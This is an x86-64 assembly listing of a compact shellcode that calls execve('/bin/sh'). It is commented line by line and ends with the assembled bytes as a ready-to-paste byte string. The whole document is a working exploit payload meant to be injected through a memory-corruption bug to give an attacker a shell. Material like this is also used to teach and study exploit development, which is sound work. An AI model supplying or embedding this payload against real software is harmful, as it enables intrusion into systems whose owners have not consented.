global _start

_start:
    ; execve("/bin/sh", NULL, NULL);
    push 0x3b                   ; execve()
    pop rax                     ; $rax = execve()

    cdq                         ; $rdx = NULL
    push rdx                    ; $rsp = &NULL
    pop rsi                     ; $rsi = NULL
    push rsi                    ; "\x00"

    mov rdi, 0x68732f2f6e69622f ; "/bin//sh"
    push rdi                    ; "/bin//sh\x00"
    push rsp                    ; "/bin/sh\x00"
    pop rdi                     ; $rdi = "/bin//sh"

    syscall                     ; syscall

; shellcode = b"\x6a\x3b\x58\x99\x52\x5e\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x0f\x05"
